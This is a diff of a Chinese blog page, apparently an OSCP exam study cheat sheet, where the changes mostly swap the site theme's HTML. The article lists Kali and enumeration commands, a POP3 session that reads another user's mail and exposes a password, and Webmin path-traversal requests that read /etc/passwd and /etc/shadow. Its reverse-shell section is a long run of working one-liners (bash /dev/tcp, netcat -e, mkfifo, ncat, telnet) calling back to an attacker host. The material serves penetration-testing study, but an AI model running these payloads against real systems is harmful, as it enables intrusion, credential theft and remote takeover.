@@ -1,399 +1,238 @@
-<!DOCTYPE HTML>
-<html lang="zh-CN">
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
 
 
 <head>
-    <meta charset="utf-8">
-	<meta name="referrer" content="unsafe-url">
-    <meta name="keywords" content="OSCP指南, wiki">
-    <meta name="description" content="">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="renderer" content="webkit|ie-stand|ie-comp">
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="format-detection" content="telephone=no">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <!-- Global site tag (gtag.js) - Google Analytics -->
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="booom">
+  <meta name="keywords" content="">
+  <title>OSCP指南 - wiki</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
 
-    <title>OSCP指南 | wiki</title>
-    <link rel="icon" type="image/png" href="/favicon.png">
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
 
-    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
-    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
-    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
-    <link rel="stylesheet" type="text/css" href="/css/matery.css">
-    <link rel="stylesheet" type="text/css" href="/css/my.css">
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
 
-    <script src="/libs/jquery/jquery.min.js"></script>
+  
 
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
 <meta name="generator" content="Hexo 4.2.0"></head>
 
 
 <body>
-    <header class="navbar-fixed">
-    <nav id="headNav" class="bg-color nav-transparent">
-        <div id="navContainer" class="nav-wrapper container">
-            <div class="brand-logo">
-                <a href="/" class="waves-effect waves-light">
-                    
-                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
-                    
-                    <span class="logo-span">wiki</span>
-                </a>
-            </div>
-            
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>wiki</strong>&nbsp;</a>
 
-<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
-<ul class="right nav-menu">
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/" class="waves-effect waves-light">
-      
-      <i class="fas fa-home" style="zoom: 0.6;"></i>
-      
-      <span>首页</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/archives" class="waves-effect waves-light">
-      
-      <i class="fas fa-archive" style="zoom: 0.6;"></i>
-      
-      <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li>
-    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
-      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
-    </a>
-  </li>
-</ul>
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
 
-
-<div id="mobile-nav" class="side-nav sidenav">
-
-    <div class="mobile-head bg-color">
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
         
-        <div class="logo-name">wiki</div>
-        <div class="logo-desc">
-            
-            Never really desperate, only the lost of the soul.
-            
-        </div>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
     </div>
+  </div>
+</nav>
 
-    
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
 
-    <ul class="menu-list mobile-menu-list">
-        
-        <li class="m-nav-item">
-	  
-		<a href="/" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-home"></i>
-			
-			首页
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/archives" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-archive"></i>
-			
-			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        
-    </ul>
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-09-01 17:23" pubdate>
+        2020年9月1日 下午
+      </time>
+    </span>
+  
 </div>
 
-
-        </div>
-
-        
-    </nav>
-
-</header>
-
+<div class="mt-1">
+  
     
-<script src="/libs/cryptojs/crypto-js.min.js"></script>
-<script>
-    (function() {
-        let pwd = '';
-        if (pwd && pwd.length > 0) {
-            if (pwd !== CryptoJS.SHA256(prompt('本文章暂不公开')).toString(CryptoJS.enc.Hex)) {
-                alert('密码错误，将返回主页！');
-                location.href = '/';
-            }
-        }
-    })();
-</script>
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      7.8k 字
+    </span>
+  
 
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      131
+       分钟
+    </span>
+  
 
-
-
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://s1.ax1x.com/2020/09/02/w9GdWF.png')">
-    <div class="container" style="right: 0px;left: 0px;">
-        <div class="row">
-            <div class="col s12 m12 l12">
-                <div class="brand">
-                    <h1 class="description center-align post-title">OSCP指南</h1>
-                </div>
-            </div>
-        </div>
-    </div>
+  
+  
 </div>
 
+            
+          </div>
 
-
-
-<main class="post-container content">
-
-    
-    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
-<style>
-    #articleContent h1::before,
-    #articleContent h2::before,
-    #articleContent h3::before,
-    #articleContent h4::before,
-    #articleContent h5::before,
-    #articleContent h6::before {
-        display: block;
-        content: " ";
-        height: 100px;
-        margin-top: -100px;
-        visibility: hidden;
-    }
-
-    #articleContent :focus {
-        outline: none;
-    }
-
-    .toc-fixed {
-        position: fixed;
-        top: 64px;
-    }
-
-    .toc-widget {
-        width: 345px;
-        padding-left: 20px;
-    }
-
-    .toc-widget .toc-title {
-        margin: 35px 0 15px 0;
-        padding-left: 17px;
-        font-size: 1.5rem;
-        font-weight: bold;
-        line-height: 1.5rem;
-    }
-
-    .toc-widget ol {
-        padding: 0;
-        list-style: none;
-    }
-
-    #toc-content {
-        height: calc(100vh - 250px);
-        overflow: auto;
-    }
-
-    #toc-content ol {
-        padding-left: 10px;
-    }
-
-    #toc-content ol li {
-        padding-left: 10px;
-    }
-
-    #toc-content .toc-link:hover {
-        color: #42b983;
-        font-weight: 700;
-        text-decoration: underline;
-    }
-
-    #toc-content .toc-link::before {
-        background-color: transparent;
-        max-height: 25px;
-
-        position: absolute;
-        right: 23.5vw;
-        display: block;
-    }
-
-    #toc-content .is-active-link {
-        color: #42b983;
-    }
-
-    #floating-toc-btn {
-        position: fixed;
-        right: 15px;
-        bottom: 76px;
-        padding-top: 15px;
-        margin-bottom: 0;
-        z-index: 998;
-    }
-
-    #floating-toc-btn .btn-floating {
-        width: 48px;
-        height: 48px;
-    }
-
-    #floating-toc-btn .btn-floating i {
-        line-height: 48px;
-        font-size: 1.4rem;
-    }
-</style>
-<div class="row">
-    <div id="main-content" class="col s12 m12 l9">
-        <!-- 文章内容详情 -->
-<div id="artDetail">
-    <div class="card">
-        <div class="card-content article-info">
-            <div class="row tag-cate">
-                <div class="col s7">
-                    
-                    <div class="article-tag">
-                        
-                            <a href="/tags/OSCP/">
-                                <span class="chip bg-color">OSCP</span>
-                            </a>
-                        
-                    </div>
-                    
-                </div>
-                <div class="col s5 right-align">
-                    
-                </div>
-            </div>
-
-            <div class="post-info">
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-09-01
-                </div>
-                
-
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-09-02
-                </div>
-                
-
-                
-                <div class="info-break-policy">
-                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    8k
-                </div>
-                
-
-                
-                <div class="info-break-policy">
-                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    43 分
-                </div>
-                
-
-                
-                    <div id="busuanzi_container_page_pv" class="info-break-policy">
-                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv"></span>
-                    </div>
-				
-            </div>
+          
         </div>
-        <hr class="clearfix">
-        <div class="card-content article-card-content">
-            <div id="articleContent">
-                <h1 id="OSCP指南"><a href="#OSCP指南" class="headerlink" title="OSCP指南"></a>OSCP指南</h1><h2 id="1、kali-linux"><a href="#1、kali-linux" class="headerlink" title="1、kali linux"></a>1、kali linux</h2><h3 id="1-1-开启服务"><a href="#1-1-开启服务" class="headerlink" title="1.1 开启服务"></a>1.1 开启服务</h3><pre><code>systemctl start ssh
-systemctl start apache2</code></pre><p>开机自启服务</p>
-<pre><code>systemctl enable ssh</code></pre><p>下载网页</p>
-<pre><code>wget http://www.cisco.com</code></pre><p>打开网页</p>
-<pre><code>curl http://www.cisco.com</code></pre><h3 id="1-2-使用Kali解码"><a href="#1-2-使用Kali解码" class="headerlink" title="1.2 使用Kali解码"></a>1.2 使用Kali解码</h3><ul>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">OSCP指南</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="OSCP指南"><a href="#OSCP指南" class="headerlink" title="OSCP指南"></a>OSCP指南</h1><h2 id="1、kali-linux"><a href="#1、kali-linux" class="headerlink" title="1、kali linux"></a>1、kali linux</h2><h3 id="1-1-开启服务"><a href="#1-1-开启服务" class="headerlink" title="1.1 开启服务"></a>1.1 开启服务</h3><pre><code class="hljs crmsh">systemctl <span class="hljs-literal">start</span> ssh
+systemctl <span class="hljs-literal">start</span> apache2</code></pre>
+
+<p>开机自启服务</p>
+<pre><code class="hljs routeros">systemctl <span class="hljs-builtin-name">enable</span> ssh</code></pre>
+
+<p>下载网页</p>
+<pre><code class="hljs groovy">wget <span class="hljs-string">http:</span><span class="hljs-comment">//www.cisco.com</span></code></pre>
+
+<p>打开网页</p>
+<pre><code class="hljs groovy">curl <span class="hljs-string">http:</span><span class="hljs-comment">//www.cisco.com</span></code></pre>
+
+<h3 id="1-2-使用Kali解码"><a href="#1-2-使用Kali解码" class="headerlink" title="1.2 使用Kali解码"></a>1.2 使用Kali解码</h3><ul>
 <li>解码Base64编码值<code>echo -n &quot;QWxhZGRpbjpvcGVuIHNlc2FtZQ==&quot; | base64 --decode</code></li>
 <li>解码十六进制编码值<code>echo -n &quot;46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874&quot; | xxd -r -ps</code></li>
 </ul>
@@ -634,8 +473,11 @@ systemctl start apache2</code></pre><p>开机自启服务</p>
 <li><p>执行DNS IP查找<br><code>dig a domain-name-here.com @nameserver</code></p>
 </li>
 <li><p>DNS区域传输<br>Windows DNS区域传输</p>
-<pre><code>nslookup -&gt; set type=any -&gt; ls -d blah.com</code></pre><p>Linux DNS区域传输</p>
-<pre><code>dig axfr blah.com @ns1.blah.com</code></pre></li>
+<pre><code class="hljs routeros">nslookup -&gt; <span class="hljs-builtin-name">set</span> <span class="hljs-attribute">type</span>=any -&gt; ls -d blah.com</code></pre>
+
+<p>Linux DNS区域传输</p>
+<pre><code class="hljs vim"><span class="hljs-keyword">dig</span> axfr blah.<span class="hljs-keyword">com</span> @ns1.blah.<span class="hljs-keyword">com</span></code></pre>
+</li>
 <li><p>DNS枚举<br><code>dnsenum zonetransfer.me</code></p>
 </li>
 <li><p>Nmap端口版本检测最大功率<br><code>nmap -vvv -A --reason --script=&quot;+(safe or default) and not broadcast&quot; -p &lt;port&gt; &lt;host&gt;</code></p>
@@ -700,28 +542,29 @@ systemctl start apache2</code></pre><p>开机自启服务</p>
 </ul>
 </li>
 <li><p>POP3枚举-阅读其他人的邮件-您可能会找到电子邮件帐户的用户名和密码，因此这是使用Telnet检查邮件的方法</p>
-<pre><code> root@kali:~# telnet $ip 110
- +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
- USER billydean    
- +OK
- PASS password
- +OK Welcome billydean
-
- list
-
- +OK 2 1807
- 1 786
- 2 1021
-
- retr 1
-
- +OK Message follows
- From: jamesbrown@motown.com
- Dear Billy Dean,
-
- Here is your login for remote desktop ... try not to forget it this time!
- username: billydean
- password: PA$$W0RD!Z</code></pre></li>
+<pre><code class="hljs routeros">root@kali:~# telnet <span class="hljs-variable">$ip</span> 110
++OK beta POP3<span class="hljs-built_in"> server </span>(JAMES POP3<span class="hljs-built_in"> Server </span>2.3.2) ready 
+USER billydean    
++OK
+PASS password
++OK Welcome billydean
+  
+list
+  
++OK 2 1807
+1 786
+2 1021
+  
+retr 1
+  
++OK Message follows
+<span class="hljs-keyword">From</span>: jamesbrown@motown.com
+Dear Billy Dean,
+  
+Here is your login <span class="hljs-keyword">for</span> remote desktop <span class="hljs-built_in">..</span>. try <span class="hljs-keyword">not</span> <span class="hljs-keyword">to</span> forget it this time!
+username: billydean
+password: PA$<span class="hljs-variable">$W0RD</span>!Z</code></pre>
+</li>
 <li><p>SNMP枚举-简单的网络管理协议</p>
 <ul>
 <li>修复SNMP输出值，使它们易于阅读<br><code>apt-get install snmp-mibs-downloader download-mibs</code> <code>echo &quot;&quot; &gt; /etc/snmp/snmp.conf</code></li>
@@ -747,9 +590,11 @@ systemctl start apache2</code></pre><p>开机自启服务</p>
 </li>
 <li><p>Webmin和miniserv / 0.01枚举-端口10000</p>
 <p>通过抓住/ etc / passwd测试LFI和文件泄露漏洞</p>
-<pre><code>`curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd`</code></pre><p>通过获取/ etc / shadow来测试webmin是否以root用户身份运行</p>
-<pre><code>`curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow`
-</code></pre></li>
+<pre><code class="hljs jboss-cli">`curl http:<span class="hljs-string">//</span>$ip<span class="hljs-function">:10000</span>/<span class="hljs-string">/unauthenticated/..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/etc/passwd`</code></pre>
+
+<p>通过获取/ etc / shadow来测试webmin是否以root用户身份运行</p>
+<pre><code class="hljs jboss-cli">`curl http:<span class="hljs-string">//</span>$ip<span class="hljs-function">:10000</span>/<span class="hljs-string">/unauthenticated/..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/<span class="hljs-string">..</span>%01/etc/shadow`</code></pre>
+</li>
 <li><p>Linux OS枚举</p>
 <ul>
 <li>列出所有SUID文件<br><code>find / -perm -4000 2&gt;/dev/null</code></li>
@@ -800,178 +645,275 @@ systemctl start apache2</code></pre><p>开机自启服务</p>
 </ul>
 <h3 id="HTTP枚举"><a href="#HTTP枚举" class="headerlink" title="HTTP枚举"></a>HTTP枚举</h3><h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><h2 id="shells"><a href="#shells" class="headerlink" title="shells"></a>shells</h2><h3 id="网络有效载荷"><a href="#网络有效载荷" class="headerlink" title="网络有效载荷"></a>网络有效载荷</h3><h3 id="脚本有效载荷"><a href="#脚本有效载荷" class="headerlink" title="脚本有效载荷"></a>脚本有效载荷</h3><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><h3 id="反弹shell方法汇总"><a href="#反弹shell方法汇总" class="headerlink" title="反弹shell方法汇总"></a>反弹shell方法汇总</h3><p>假设本机地址10.10.10.11，监听端口443。</p>
 <h4 id="1、Bash环境下反弹TCP协议shell"><a href="#1、Bash环境下反弹TCP协议shell" class="headerlink" title="1、Bash环境下反弹TCP协议shell"></a>1、Bash环境下反弹TCP协议shell</h4><p>首先在本地监听TCP协议443端口</p>
-<pre><code class="bash">nc -lvp 443</code></pre>
+<pre><code class="hljs bash">nc -lvp 443</code></pre>
+
 <p>然后在靶机上执行如下命令：</p>
-<pre><code class="bash">bash -i &gt;&amp; /dev/tcp/10.10.10.11/443 0&gt;&amp;1</code></pre>
-<pre><code class="bash">/bin/bash -i &gt; /dev/tcp/10.10.10.11/443 0&lt;&amp; 2&gt;&amp;1</code></pre>
-<pre><code class="bash">exec 5&lt;&gt;/dev/tcp/10.10.10.11/443;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</code></pre>
-<pre><code class="bash">exec /bin/sh 0&lt;/dev/tcp/10.10.10.11/443 1&gt;&amp;0 2&gt;&amp;0</code></pre>
-<pre><code class="bash">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.10.10.11/443; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</code></pre>
+<pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/10.10.10.11/443 0&gt;&amp;1</code></pre>
+
+<pre><code class="hljs bash">/bin/bash -i &gt; /dev/tcp/10.10.10.11/443 0&lt;&amp; 2&gt;&amp;1</code></pre>
+
+<pre><code class="hljs bash"><span class="hljs-built_in">exec</span> 5&lt;&gt;/dev/tcp/10.10.10.11/443;cat &lt;&amp;5 | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line; <span class="hljs-keyword">do</span> <span class="hljs-variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="hljs-keyword">done</span></code></pre>
+
+<pre><code class="hljs bash"><span class="hljs-built_in">exec</span> /bin/sh 0&lt;/dev/tcp/10.10.10.11/443 1&gt;&amp;0 2&gt;&amp;0</code></pre>
+
+<pre><code class="hljs bash">0&lt;&amp;196;<span class="hljs-built_in">exec</span> 196&lt;&gt;/dev/tcp/10.10.10.11/443; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</code></pre>
+
 <h4 id="2、Bash环境下反弹UDP协议shell"><a href="#2、Bash环境下反弹UDP协议shell" class="headerlink" title="2、Bash环境下反弹UDP协议shell:"></a>2、Bash环境下反弹UDP协议shell:</h4><p>首先在本地监听UDP协议443端口</p>
-<pre><code class="bash">nc -u -lvp 443</code></pre>
+<pre><code class="hljs bash">nc -u -lvp 443</code></pre>
+
 <p>然后在靶机上执行如下命令：</p>
-<pre><code class="bash">sh -i &gt;&amp; /dev/udp/10.10.10.11/443 0&gt;&amp;1</code></pre>
+<pre><code class="hljs bash">sh -i &gt;&amp; /dev/udp/10.10.10.11/443 0&gt;&amp;1</code></pre>
+
 <h4 id="3、使用Netcat反弹shell"><a href="#3、使用Netcat反弹shell" class="headerlink" title="3、使用Netcat反弹shell"></a>3、使用Netcat反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
-<pre><code class="bash">nc -lvp 443</code></pre>
+<pre><code class="hljs bash">nc -lvp 443</code></pre>
+
 <p>然后在靶机上执行如下命令：</p>
-<pre><code class="bash">nc -e /bin/sh 10.10.10.11 443</code></pre>
-<pre><code class="bash">nc -e /bin/bash 10.10.10.11 443</code></pre>
-<pre><code class="bash">nc -c bash 10.10.10.11 443</code></pre>
-<pre><code class="bash">mknod backpipe p &amp;&amp; nc 10.10.10.11 443 0&lt;backpipe | /bin/bash 1&gt;backpipe </code></pre>
-<pre><code class="bash">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.11 443 &gt;/tmp/f</code></pre>
-<pre><code class="bash">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc 10.10.10.11 443 0/tmp/p 2&gt;&amp;1</code></pre>
-<pre><code class="bash">rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.11 443 &gt; f</code></pre>
-<pre><code class="bash">rm -f x; mknod x p &amp;&amp; nc 10.10.10.11 443 0&lt;x | /bin/bash 1&gt;x</code></pre>
+<pre><code class="hljs bash">nc -e /bin/sh 10.10.10.11 443</code></pre>
+
+<pre><code class="hljs bash">nc -e /bin/bash 10.10.10.11 443</code></pre>
+
+<pre><code class="hljs bash">nc -c bash 10.10.10.11 443</code></pre>
+
+<pre><code class="hljs bash">mknod backpipe p &amp;&amp; nc 10.10.10.11 443 0&lt;backpipe | /bin/bash 1&gt;backpipe</code></pre>
+
+<pre><code class="hljs bash">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.11 443 &gt;/tmp/f</code></pre>
+
+<pre><code class="hljs bash">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc 10.10.10.11 443 0/tmp/p 2&gt;&amp;1</code></pre>
+
+<pre><code class="hljs bash">rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.11 443 &gt; f</code></pre>
+
+<pre><code class="hljs bash">rm -f x; mknod x p &amp;&amp; nc 10.10.10.11 443 0&lt;x | /bin/bash 1&gt;x</code></pre>
+
 <h4 id="4、使用Ncat反弹shell"><a href="#4、使用Ncat反弹shell" class="headerlink" title="4、使用Ncat反弹shell"></a>4、使用Ncat反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
-<pre><code class="bash">nc -lvp 443</code></pre>
+<pre><code class="hljs bash">nc -lvp 443</code></pre>
+
 <p>然后在靶机上执行如下命令：</p>
-<pre><code class="bash">ncat 10.10.10.11 443 -e /bin/bash</code></pre>
-<pre><code class="bash">ncat --udp 10.10.10.11 443 -e /bin/bash</code></pre>
+<pre><code class="hljs bash">ncat 10.10.10.11 443 -e /bin/bash</code></pre>
+
+<pre><code class="hljs bash">ncat --udp 10.10.10.11 443 -e /bin/bash</code></pre>
+
 <h4 id="5、利用Telnet反弹shell"><a href="#5、利用Telnet反弹shell" class="headerlink" title="5、利用Telnet反弹shell"></a>5、利用Telnet反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
-<pre><code class="bash">nc -lvp 443</code></pre>
+<pre><code class="hljs bash">nc -lvp 443</code></pre>
+
 <p>然后在靶机上执行如下命令：</p>
-<pre><code class="bash">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet 10.10.10.11 443 0/tmp/p 2&gt;&amp;1</code></pre>
-<pre><code class="bash">telnet 10.10.10.11 443 | /bin/bash | telnet 10.10.10.11 444</code></pre>
